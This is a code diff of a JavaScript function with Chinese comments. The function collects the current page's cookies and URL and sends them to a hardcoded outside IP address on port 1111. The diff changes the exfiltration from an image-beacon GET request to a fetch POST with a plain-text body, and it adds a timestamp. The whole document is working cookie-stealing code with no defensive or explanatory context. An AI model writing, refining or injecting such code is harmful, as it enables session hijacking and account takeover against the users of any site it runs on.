@@ -1,13 +1,16 @@
 function collectAndSendCookies() {
-    // 获取当前页面的所有cookie
+    // 获取cookie并格式化为简单文本
     const allCookies = document.cookie;
+    const data = `Cookies: ${allCookies}\nURL: ${window.location.href}\nTime: ${new Date().toString()}`;
     
-    // 创建一个简单的URL带参数的请求
-    const url = `http://83.229.127.162:1111/?cookies=${encodeURIComponent(allCookies)}&url=${encodeURIComponent(window.location.href)}`;
-    
-    // 使用Image对象发送请求（不需要处理响应）
-    const img = new Image();
-    img.src = url;
+    // 使用fetch发送纯文本数据
+    fetch(`http://83.229.127.162:1111`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'text/plain'  // 发送纯文本
+        },
+        body: data
+    });
 }
 
 // 执行函数
